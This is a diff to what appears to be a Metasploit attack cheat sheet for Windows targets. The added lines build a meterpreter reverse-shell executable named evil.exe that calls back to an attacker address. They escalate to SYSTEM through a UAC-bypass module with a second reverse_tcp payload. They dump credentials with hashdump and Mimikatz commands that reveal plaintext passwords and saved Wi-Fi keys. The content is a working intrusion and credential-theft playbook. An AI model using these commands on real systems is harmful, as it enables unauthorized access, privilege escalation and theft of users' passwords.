@@ -72,6 +72,13 @@ set LHOST <attacker IP>
 exploit
 ------------------------------------------------------------------------------------------------------
 
+# msfvenom
+
+msfvenom -p <payload parameter=value> -f <file format> --playform <OS platform> -o <output file>
+ 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe --platform windows -o evil.exe
+------------------------------------------------------------------------------------------------------
+
 # psexec
 
 use windows/smb/psexec
@@ -97,19 +104,33 @@ getuid                                        Show current privileges.
 # Escalate Privileges
 
 getsystem                                     If this fails, background the session.
-use post/windows/escalate/bypassuac
-set session <#>                               Set to background session.
-run
-sessions -l
-sessions -i #                                 Interact with new session.
-getuid                                        Show current privileges.
-getsystem                                
+background
+
+use exploit/windows/local/bypassuac_vbs
+set session <#>                               
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set LPORT 4444                                This MUST be a different port from what was used in the original exploit.
+exploit
+
+migrate
+getuid
+getsystem
 getuid                                        Privileges should now be NT AUTHORITY\SYSTEM.
+------------------------------------------------------------------------------------------------------
+
+# Dump hashes & passwords
 
 hashdump                                      Try to dump password hashes. If this fails continue.
 ps                                            Show running processes.
 migrate <pid>                                 Migrate to a specific process running as NT AUTHORITY\SYSTEM.
-hashdump                                      Dump password hashes.
+hashdump
+
+load kiwi                                     Mimikatz
+lsa_dump                                      Show the current user password in plain text.
+creds_all                                     Show all user passwords in plain text.
+wifi_list                                     Show all wireless networks that have been connected and passwords.
+------------------------------------------------------------------------------------------------------
 
 # Misc
 
